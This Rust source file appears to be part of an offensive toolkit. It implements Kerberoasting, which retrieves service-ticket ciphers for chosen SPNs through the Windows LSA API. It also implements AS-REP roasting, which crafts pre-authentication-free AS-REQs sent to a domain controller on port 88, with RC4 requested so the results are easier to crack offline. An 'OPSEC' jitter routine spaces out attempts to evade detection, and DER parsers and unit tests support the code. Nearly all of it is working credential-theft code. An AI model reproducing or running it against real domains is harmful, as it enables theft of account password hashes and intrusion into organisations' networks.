//! Kerberos TGS (Kerberoast) + AS-REP acquisition.
//! Pure DER helpers are unit-tested; live LSA/TCP is Windows-only.

/// Extract cipher OCTET STRING from a Kerberos Ticket DER (APPLICATION 1 / 0x61).
/// Returns owned bytes on success.
pub fn extract_ticket_cipher(ticket_der: &[u8]) -> Option<Vec<u8>> {
    let mut off = 0usize;
    let (tag, v) = der_next(ticket_der, &mut off)?;
    if tag != 0x61 {
        return None;
    }
    let seq = der_find(v, 0x30)?;
    let enc = der_find(seq, 0xa3)?;
    let eseq = der_find(enc, 0x30)?;
    let ctx2 = der_find(eseq, 0xa2)?;
    let ostr = der_find(ctx2, 0x04)?;
    if ostr.len() < 17 {
        return None;
    }
    Some(ostr.to_vec())
}

/// Extract cipher from AS-REP DER (APPLICATION 11 / 0x6b) enc-part [6].
pub fn extract_asrep_cipher(asrep_der: &[u8]) -> Option<Vec<u8>> {
    let mut off = 0usize;
    let (tag, v) = der_next(asrep_der, &mut off)?;
    if tag != 0x6b {
        return None;
    }
    let seq = der_find(v, 0x30)?;
    let enc = der_find(seq, 0xa6)?;
    let eseq = der_find(enc, 0x30)?;
    let ctx2 = der_find(eseq, 0xa2)?;
    let ostr = der_find(ctx2, 0x04)?;
    if ostr.len() < 17 {
        return None;
    }
    Some(ostr.to_vec())
}

fn der_read_len(buf: &[u8], off: &mut usize) -> Option<usize> {
    if *off >= buf.len() {
        return None;
    }
    let b = buf[*off];
    *off += 1;
    if b & 0x80 == 0 {
        return Some(b as usize);
    }
    let nb = (b & 0x7f) as usize;
    if nb == 0 || nb > 4 || *off + nb > buf.len() {
        return None;
    }
    let mut len = 0usize;
    for _ in 0..nb {
        len = (len << 8) | (buf[*off] as usize);
        *off += 1;
    }
    Some(len)
}

/// Return (tag, value_slice) and advance off past the TLV.
fn der_next<'a>(buf: &'a [u8], off: &mut usize) -> Option<(u8, &'a [u8])> {
    if *off >= buf.len() {
        return None;
    }
    let tag = buf[*off];
    *off += 1;
    let len = der_read_len(buf, off)?;
    if *off + len > buf.len() {
        return None;
    }
    let val = &buf[*off..*off + len];
    *off += len;
    Some((tag, val))
}

/// Find first child with `tag` inside `buf` (contents of a constructed value).
fn der_find<'a>(buf: &'a [u8], tag: u8) -> Option<&'a [u8]> {
    let mut off = 0usize;
    while let Some((t, v)) = der_next(buf, &mut off) {
        if t == tag {
            return Some(v);
        }
    }
    None
}

// ─── DER builder for minimal AS-REQ ─────────────────────────────────────────

struct DerBuf {
    d: Vec<u8>,
}

impl DerBuf {
    fn new() -> Self {
        Self { d: Vec::with_capacity(256) }
    }

    fn push(&mut self, data: &[u8]) {
        self.d.extend_from_slice(data);
    }

    fn wrap(&mut self, start: usize, tag: u8) {
        let content = self.d[start..].to_vec();
        self.d.truncate(start);
        self.d.push(tag);
        encode_len(&mut self.d, content.len());
        self.d.extend_from_slice(&content);
    }

    fn integer(&mut self, mut v: u32) {
        let mut bytes = Vec::new();
        if v == 0 {
            bytes.push(0);
        } else {
            while v > 0 {
                bytes.push((v & 0xff) as u8);
                v >>= 8;
            }
            bytes.reverse();
            if bytes[0] & 0x80 != 0 {
                bytes.insert(0, 0);
            }
        }
        self.d.push(0x02);
        encode_len(&mut self.d, bytes.len());
        self.d.extend_from_slice(&bytes);
    }

    fn genstr(&mut self, s: &str) {
        let b = s.as_bytes();
        self.d.push(0x1b); // GeneralString
        encode_len(&mut self.d, b.len());
        self.d.extend_from_slice(b);
    }

    /// Emit a SEQUENCE OF GeneralString for PrincipalName.name-string.
    /// Layout: 0x30 SEQUENCE { 0x1b GeneralString, 0x1b GeneralString, ... }
    fn genstr_seq_of(&mut self, strs: &[&str]) {
        let start = self.d.len();
        for s in strs {
            self.genstr(s);
        }
        let inner = self.d[start..].to_vec();
        self.d.truncate(start);
        self.d.push(0x30);
        encode_len(&mut self.d, inner.len());
        self.d.extend_from_slice(&inner);
    }
}

/// For tests: walk the sname name-string of an AS-REQ and return the list of GeneralString values.
/// Returns None on parse failure.
/// This descends into constructed values (unlike bare der_find) so it can locate fields inside
/// the KDC-REQ-BODY SEQUENCE and the PrincipalName SEQUENCE.
#[cfg(test)]
pub fn test_decode_asreq_sname_strings(asreq: &[u8]) -> Option<Vec<String>> {
    let mut off = 0usize;
    // APP 10
    let (tag, v) = der_next(asreq, &mut off)?;
    if tag != 0x6a {
        return None;
    }
    // KDC-REQ SEQUENCE (value is the fields)
    let kdc_req_fields = der_find(v, 0x30)?;

    // req-body [4] 0xa4 — its value is the KDC-REQ-BODY SEQUENCE TLV (30 len ...)
    let rb_seq_tlv = der_find(kdc_req_fields, 0xa4)?;
    // Descend into the 0x30 to get the actual KDC-REQ-BODY fields
    let rb_fields = der_find(rb_seq_tlv, 0x30)?;

    // sname [3] 0xa3 — its value is the PrincipalName SEQUENCE TLV
    let sname_pn_tlv = der_find(rb_fields, 0xa3)?;
    // Descend to get PrincipalName fields
    let pn_fields = der_find(sname_pn_tlv, 0x30)?;

    // name-string [1] 0xa1 — its value is the SEQUENCE OF GeneralString TLV
    let ns_seq_tlv = der_find(pn_fields, 0xa1)?;
    // Descend to get the elements
    let elems = der_find(ns_seq_tlv, 0x30)?;

    let mut out = Vec::new();
    let mut eoff = 0usize;
    while let Some((t, val)) = der_next(elems, &mut eoff) {
        if t != 0x1b {
            return None; // must be GeneralString, not a nested SEQUENCE
        }
        out.push(String::from_utf8_lossy(val).into_owned());
    }
    Some(out)
}

fn encode_len(out: &mut Vec<u8>, len: usize) {
    if len < 0x80 {
        out.push(len as u8);
    } else if len <= 0xff {
        out.push(0x81);
        out.push(len as u8);
    } else if len <= 0xffff {
        out.push(0x82);
        out.push((len >> 8) as u8);
        out.push((len & 0xff) as u8);
    } else {
        out.push(0x83);
        out.push((len >> 16) as u8);
        out.push(((len >> 8) & 0xff) as u8);
        out.push((len & 0xff) as u8);
    }
}

/// Build a minimal Kerberos AS-REQ (no pre-auth) for `username` @ `realm`.
pub fn build_asreq(username: &str, realm: &str, etype: i32, nonce: u32) -> Vec<u8> {
    let mut b = DerBuf::new();
    let rb_start = b.d.len();
    {
        // kdc-options [0]
        let s = b.d.len();
        b.push(&[0x03, 0x05, 0x00, 0x40, 0x00, 0x00, 0x10]);
        b.wrap(s, 0xa0);

        // cname [1] PrincipalName { NT-PRINCIPAL=1, username } — name-string is SEQUENCE OF GeneralString
        {
            let cn = b.d.len();
            {
                let pn = b.d.len();
                {
                    let ss = b.d.len();
                    b.integer(1);
                    b.wrap(ss, 0xa0);
                }
                {
                    let ns = b.d.len();
                    b.genstr_seq_of(&[username]);
                    b.wrap(ns, 0xa1);
                }
                b.wrap(pn, 0x30);
            }
            b.wrap(cn, 0xa1);
        }

        // realm [2]
        {
            let s2 = b.d.len();
            b.genstr(realm);
            b.wrap(s2, 0xa2);
        }

        // sname [3] krbtgt/realm — name-string is SEQUENCE OF GeneralString
        {
            let sn = b.d.len();
            {
                let pn = b.d.len();
                {
                    let ss = b.d.len();
                    b.integer(2);
                    b.wrap(ss, 0xa0);
                }
                {
                    let ns = b.d.len();
                    b.genstr_seq_of(&["krbtgt", realm]);
                    b.wrap(ns, 0xa1);
                }
                b.wrap(pn, 0x30);
            }
            b.wrap(sn, 0xa3);
        }

        // till [5]
        {
            let s2 = b.d.len();
            let ts = b"99991231235959Z";
            b.d.push(0x18);
            encode_len(&mut b.d, ts.len());
            b.push(ts);
            b.wrap(s2, 0xa5);
        }

        // nonce [7]
        {
            let s2 = b.d.len();
            b.integer(nonce);
            b.wrap(s2, 0xa7);
        }

        // etype [8]
        {
            let et = b.d.len();
            {
                let ss = b.d.len();
                b.integer(etype as u32);
                b.wrap(ss, 0x30);
            }
            b.wrap(et, 0xa8);
        }

        b.wrap(rb_start, 0x30);
    }
    b.wrap(rb_start, 0xa4);

    // prepend pvno + msg-type
    let mut front = DerBuf::new();
    {
        let s = front.d.len();
        front.integer(5);
        front.wrap(s, 0xa1);
    }
    {
        let s = front.d.len();
        front.integer(10);
        front.wrap(s, 0xa2);
    }
    let mut body = front.d;
    body.extend_from_slice(&b.d);
    b.d = body;

    b.wrap(0, 0x30);
    b.wrap(0, 0x6a);
    b.d
}

/// Retrieve TGS cipher for SPN via LSA (Windows). Offline/non-windows → None.
pub fn retrieve_tgs_cipher(spn: &str, etype: i32) -> Result<Vec<u8>, String> {
    #[cfg(not(windows))]
    {
        let _ = (spn, etype);
        Err("unsupported_platform".into())
    }
    #[cfg(windows)]
    {
        windows_retrieve_tgs(spn, etype)
    }
}

/// AS-REP roast one user against DC:88. Returns cipher bytes.
pub fn asrep_cipher_for_user(
    username: &str,
    realm: &str,
    dc_host: &str,
) -> Result<Vec<u8>, String> {
    #[cfg(not(windows))]
    {
        let _ = (username, realm, dc_host);
        Err("unsupported_platform".into())
    }
    #[cfg(windows)]
    {
        windows_asrep(username, realm, dc_host)
    }
}

/// Sleep jitter between roast attempts (OPSEC).
pub fn roast_jitter(min_ms: u64, max_ms: u64) {
    let lo = min_ms.min(max_ms);
    let hi = min_ms.max(max_ms);
    let span = hi.saturating_sub(lo).max(1);
    let ms = lo + (std::process::id() as u64 * 17 + 0x9e37) % span;
    std::thread::sleep(std::time::Duration::from_millis(ms));
}

// ─── Windows LSA / TCP ──────────────────────────────────────────────────────

#[cfg(windows)]
mod win_lsa {
    use super::extract_ticket_cipher;
    use std::ffi::c_void;
    use std::mem;
    use std::ptr;

    type NtStatus = i32;
    const STATUS_SUCCESS: NtStatus = 0;
    const KERB_RETRIEVE_ENCODED_TICKET_MESSAGE: u32 = 4;
    const KERB_RETRIEVE_TICKET_DONT_USE_CACHE: u32 = 0x1;

    #[repr(C)]
    struct LsaString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u8,
    }

    #[repr(C)]
    struct UnicodeString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    #[repr(C)]
    struct Luid {
        low_part: u32,
        high_part: i32,
    }

    /// SecHandle (from sspi.h): two ULONG_PTR fields, 16 bytes on x64.
    /// Using raw usize to match platform pointer size without pulling in winapi.
    #[repr(C)]
    #[derive(Clone, Copy)]
    struct SecHandle {
        dw_lower: usize,
        dw_upper: usize,
    }

    #[repr(C)]
    struct KerbRetrieveTktRequest {
        message_type: u32,
        logon_id: Luid,
        target_name: UnicodeString,
        ticket_flags: u32,
        cache_options: u32,
        encryption_type: i32,
        credentials_handle: SecHandle,
    }

    #[repr(C)]
    struct KerbCryptoKey {
        key_type: i32,
        length: u32,
        value: *mut u8,
    }

    #[repr(C)]
    struct KerbExternalName {
        name_type: i16,
        name_count: u16,
        // Names[1] follows — not used
    }

    #[repr(C)]
    struct KerbExternalTicket {
        service_name: *mut KerbExternalName,
        target_name: *mut KerbExternalName,
        client_name: *mut KerbExternalName,
        domain_name: UnicodeString,
        target_domain_name: UnicodeString,
        alt_target_domain_name: UnicodeString,
        session_key: KerbCryptoKey,
        ticket_flags: u32,
        flags: u32,
        key_expiration_time: i64,
        start_time: i64,
        end_time: i64,
        renew_until: i64,
        time_skew: i64,
        encoded_ticket_size: u32,
        encoded_ticket: *mut u8,
    }

    #[repr(C)]
    struct KerbRetrieveTktResponse {
        ticket: KerbExternalTicket,
    }

    #[link(name = "Secur32")]
    extern "system" {
        fn LsaConnectUntrusted(lsa_handle: *mut *mut c_void) -> NtStatus;
        fn LsaLookupAuthenticationPackage(
            lsa_handle: *mut c_void,
            package_name: *mut LsaString,
            authentication_package: *mut u32,
        ) -> NtStatus;
        fn LsaCallAuthenticationPackage(
            lsa_handle: *mut c_void,
            authentication_package: u32,
            protocol_submit_buffer: *mut c_void,
            submit_buffer_length: u32,
            protocol_return_buffer: *mut *mut c_void,
            return_buffer_length: *mut u32,
            protocol_status: *mut NtStatus,
        ) -> NtStatus;
        fn LsaFreeReturnBuffer(buffer: *mut c_void) -> NtStatus;
        fn LsaDeregisterLogonProcess(lsa_handle: *mut c_void) -> NtStatus;
    }

    pub fn retrieve_tgs(spn: &str, etype: i32) -> Result<Vec<u8>, String> {
        let mut h_lsa: *mut c_void = ptr::null_mut();
        let st = unsafe { LsaConnectUntrusted(&mut h_lsa) };
        if st != STATUS_SUCCESS || h_lsa.is_null() {
            return Err(format!("LsaConnectUntrusted 0x{st:x}"));
        }

        let mut pkg_name_bytes = b"Kerberos\0".to_vec();
        let mut pkg = LsaString {
            length: 8,
            maximum_length: 9,
            buffer: pkg_name_bytes.as_mut_ptr(),
        };
        let mut pkg_id: u32 = 0;
        let st = unsafe { LsaLookupAuthenticationPackage(h_lsa, &mut pkg, &mut pkg_id) };
        if st != STATUS_SUCCESS {
            unsafe {
                LsaDeregisterLogonProcess(h_lsa);
            }
            return Err(format!("LsaLookupAuthenticationPackage 0x{st:x}"));
        }

        let spn_w: Vec<u16> = spn.encode_utf16().collect();
        let spn_bytes = spn_w.len() * 2;
        let req_sz = mem::size_of::<KerbRetrieveTktRequest>() + spn_bytes + 2;
        let mut buf = vec![0u8; req_sz];
        // Place SPN wide string after the request struct
        let spn_off = mem::size_of::<KerbRetrieveTktRequest>();
        unsafe {
            let dst = buf.as_mut_ptr().add(spn_off) as *mut u16;
            ptr::copy_nonoverlapping(spn_w.as_ptr(), dst, spn_w.len());
            // null terminator already zeroed
        }

        let req = buf.as_mut_ptr() as *mut KerbRetrieveTktRequest;
        unsafe {
            ptr::write_bytes(req, 0, 1);
            (*req).message_type = KERB_RETRIEVE_ENCODED_TICKET_MESSAGE;
            (*req).cache_options = KERB_RETRIEVE_TICKET_DONT_USE_CACHE;
            (*req).encryption_type = etype;
            (*req).target_name.buffer = buf.as_mut_ptr().add(spn_off) as *mut u16;
            (*req).target_name.length = spn_bytes as u16;
            (*req).target_name.maximum_length = (spn_bytes + 2) as u16;
        }

        let mut resp: *mut c_void = ptr::null_mut();
        let mut resp_sz: u32 = 0;
        let mut sub: NtStatus = 0;
        let st = unsafe {
            LsaCallAuthenticationPackage(
                h_lsa,
                pkg_id,
                buf.as_mut_ptr() as *mut c_void,
                req_sz as u32,
                &mut resp,
                &mut resp_sz,
                &mut sub,
            )
        };

        let result = if st == STATUS_SUCCESS && !resp.is_null() {
            let tkt = unsafe { &*(resp as *const KerbRetrieveTktResponse) };
            let et = tkt.ticket.encoded_ticket;
            let et_sz = tkt.ticket.encoded_ticket_size as usize;
            if et.is_null() || et_sz == 0 {
                Err("empty encoded ticket".into())
            } else {
                let der = unsafe { std::slice::from_raw_parts(et, et_sz) };
                extract_ticket_cipher(der).ok_or_else(|| "ticket cipher parse failed".into())
            }
        } else {
            Err(format!("LsaCall 0x{st:x} sub=0x{sub:x}"))
        };

        if !resp.is_null() {
            unsafe {
                LsaFreeReturnBuffer(resp);
            }
        }
        unsafe {
            LsaDeregisterLogonProcess(h_lsa);
        }
        result
    }
}

#[cfg(windows)]
fn windows_retrieve_tgs(spn: &str, etype: i32) -> Result<Vec<u8>, String> {
    win_lsa::retrieve_tgs(spn, etype)
}

#[cfg(windows)]
fn windows_asrep(username: &str, realm: &str, dc_host: &str) -> Result<Vec<u8>, String> {
    use std::io::{Read, Write};
    use std::net::TcpStream;
    use std::time::Duration;

    let asreq = build_asreq(username, &realm.to_uppercase(), 23, 0x1234_5678);
    let host = dc_host.trim_start_matches('\\');
    let addr = format!("{host}:88");
    let mut stream = TcpStream::connect(&addr).map_err(|e| format!("connect {addr}: {e}"))?;
    stream
        .set_read_timeout(Some(Duration::from_secs(15)))
        .ok();
    stream
        .set_write_timeout(Some(Duration::from_secs(15)))
        .ok();

    // Kerberos TCP: 4-byte big-endian length prefix
    let mut frame = Vec::with_capacity(4 + asreq.len());
    let len = asreq.len() as u32;
    frame.extend_from_slice(&len.to_be_bytes());
    frame.extend_from_slice(&asreq);
    stream
        .write_all(&frame)
        .map_err(|e| format!("write AS-REQ: {e}"))?;

    let mut hdr = [0u8; 4];
    stream
        .read_exact(&mut hdr)
        .map_err(|e| format!("read AS-REP len: {e}"))?;
    let rlen = u32::from_be_bytes(hdr) as usize;
    if rlen == 0 || rlen > 64 * 1024 {
        return Err(format!("bad AS-REP length {rlen}"));
    }
    let mut body = vec![0u8; rlen];
    stream
        .read_exact(&mut body)
        .map_err(|e| format!("read AS-REP body: {e}"))?;

    extract_asrep_cipher(&body).ok_or_else(|| "AS-REP cipher parse failed".into())
}

// Provide minimal duplicates for test size calc (no private types).
#[cfg(test)]
mod test_layout {
    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct Luid {
        pub low_part: u32,
        pub high_part: i32,
    }
    #[repr(C)]
    pub struct UnicodeString {
        pub length: u16,
        pub maximum_length: u16,
        pub buffer: *mut u16,
    }
    #[repr(C)]
    #[derive(Clone, Copy)]
    pub struct SecHandle {
        pub dw_lower: usize,
        pub dw_upper: usize,
    }
    #[repr(C)]
    pub struct KERB_RETRIEVE_TKT_REQUEST {
        pub message_type: u32,
        pub logon_id: Luid,
        pub target_name: UnicodeString,
        pub ticket_flags: u32,
        pub cache_options: u32,
        pub encryption_type: i32,
        pub credentials_handle: SecHandle,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal synthetic Ticket DER with cipher of 20 bytes.
    fn synthetic_ticket(cipher: &[u8]) -> Vec<u8> {
        // Build: 0x61 APP1 { 0x30 { 0xa3 { 0x30 { 0xa2 { 0x04 cipher }}}}}
        let mut inner = Vec::new();
        // 0x04 cipher
        inner.push(0x04);
        encode_len(&mut inner, cipher.len());
        inner.extend_from_slice(cipher);
        // wrap a2
        {
            let c = inner.clone();
            inner.clear();
            inner.push(0xa2);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        // wrap 30 EncryptedData
        {
            let c = inner.clone();
            inner.clear();
            inner.push(0x30);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        // wrap a3 enc-part
        {
            let c = inner.clone();
            inner.clear();
            inner.push(0xa3);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        // wrap 30 Ticket seq
        {
            let c = inner.clone();
            inner.clear();
            inner.push(0x30);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        // wrap 61 APP1
        {
            let c = inner.clone();
            inner.clear();
            inner.push(0x61);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        inner
    }

    fn synthetic_asrep(cipher: &[u8]) -> Vec<u8> {
        let mut inner = Vec::new();
        inner.push(0x04);
        encode_len(&mut inner, cipher.len());
        inner.extend_from_slice(cipher);
        for tag in [0xa2u8, 0x30, 0xa6, 0x30] {
            let c = inner.clone();
            inner.clear();
            inner.push(tag);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        // APP 11
        {
            let c = inner.clone();
            inner.clear();
            inner.push(0x6b);
            encode_len(&mut inner, c.len());
            inner.extend_from_slice(&c);
        }
        inner
    }

    #[test]
    fn ticket_cipher_extract() {
        let cipher = [0xABu8; 20];
        let der = synthetic_ticket(&cipher);
        let out = extract_ticket_cipher(&der).expect("cipher");
        assert_eq!(out, cipher);
    }

    #[test]
    fn asrep_cipher_extract() {
        let cipher = [0x11u8; 24];
        let der = synthetic_asrep(&cipher);
        let out = extract_asrep_cipher(&der).expect("cipher");
        assert_eq!(out, cipher);
    }

    #[test]
    fn asreq_has_app10_tag() {
        let req = build_asreq("alice", "CORP.LOCAL", 23, 42);
        assert!(!req.is_empty());
        assert_eq!(req[0], 0x6a); // APPLICATION 10
    }

    #[test]
    fn short_cipher_rejected() {
        let der = synthetic_ticket(&[1u8; 8]);
        assert!(extract_ticket_cipher(&der).is_none());
    }

    /// Size/shape test for the LSA request struct (SecHandle must be 16B on 64-bit).
    /// This would have caught the 56B vs 64B bug (SPN bytes overlapping CredentialsHandle).
    #[test]
    fn kerb_request_struct_size_is_64_on_64bit() {
        // Test mirror (always available)
        let sz = std::mem::size_of::<test_layout::KERB_RETRIEVE_TKT_REQUEST>();
        // On 64-bit pointers: 4 (u32) + 8 (Luid) + 16 (Unicode) + 4+4+4 + 16 (SecHandle) + padding = 64
        // On 32-bit: 4+8+8+4+4+4+8 = 40. We assert the 64-bit expectation when pointers are 8B.
        if std::mem::size_of::<usize>() == 8 {
            assert_eq!(sz, 64, "KERB_RETRIEVE_TKT_REQUEST must be 64 bytes on x64 (was overlapping SecHandle)");
            let sh = std::mem::size_of::<test_layout::SecHandle>();
            assert_eq!(sh, 16, "SecHandle must be 16 bytes (two usize)");
        } else {
            // 32-bit: just ensure it is not accidentally using a too-small handle
            let sh = std::mem::size_of::<test_layout::SecHandle>();
            assert_eq!(sh, 8, "SecHandle must be 8 bytes on 32-bit");
        }
    }

    /// Decode the sname name-string from a built AS-REQ and assert it is a flat
    /// SEQUENCE OF GeneralString, not SEQUENCE{SEQUENCE{GS},SEQUENCE{GS}}.
    /// This would have caught the broken sname shape that causes KDC to reject AS-REQ.
    #[test]
    fn asreq_sname_is_sequence_of_generalstring() {
        let req = build_asreq("alice", "CORP.LOCAL", 23, 42);
        let names = test_decode_asreq_sname_strings(&req)
            .expect("should decode sname name-string");
        assert_eq!(names, vec!["krbtgt".to_string(), "CORP.LOCAL".to_string()],
                   "sname name-string must be SEQUENCE OF GeneralString with exactly two strings");
        // Also sanity: cname should decode to single name (we don't have a cname decoder here,
        // but building must not have panicked and the overall tag is correct).
        assert_eq!(req[0], 0x6a);
    }
}
